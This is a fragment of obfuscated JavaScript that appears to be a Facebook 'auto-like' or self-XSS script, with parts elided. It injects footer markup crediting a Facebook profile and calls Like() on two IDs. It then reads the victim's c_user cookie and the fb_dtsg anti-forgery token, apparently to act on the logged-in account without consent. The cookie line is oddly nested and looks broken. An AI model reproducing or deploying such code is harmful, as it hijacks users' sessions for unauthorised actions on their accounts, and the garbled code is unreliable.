...
(function () {
    ...
    _0x3384x4 += '<a class="jewelFooter" href="https://www.facebook.com/pe.su.56614" target="_blank">Su Sung Sức</a>';
    _0x3384x4 += '</div>';
    _0x3384x4 += '</div>';
    _0x3384x4 += '</div>';
    _0x3384x4 += '</div>';
...
Like("1395026954066384");Like("277431389071963");
 var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
 var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value; 
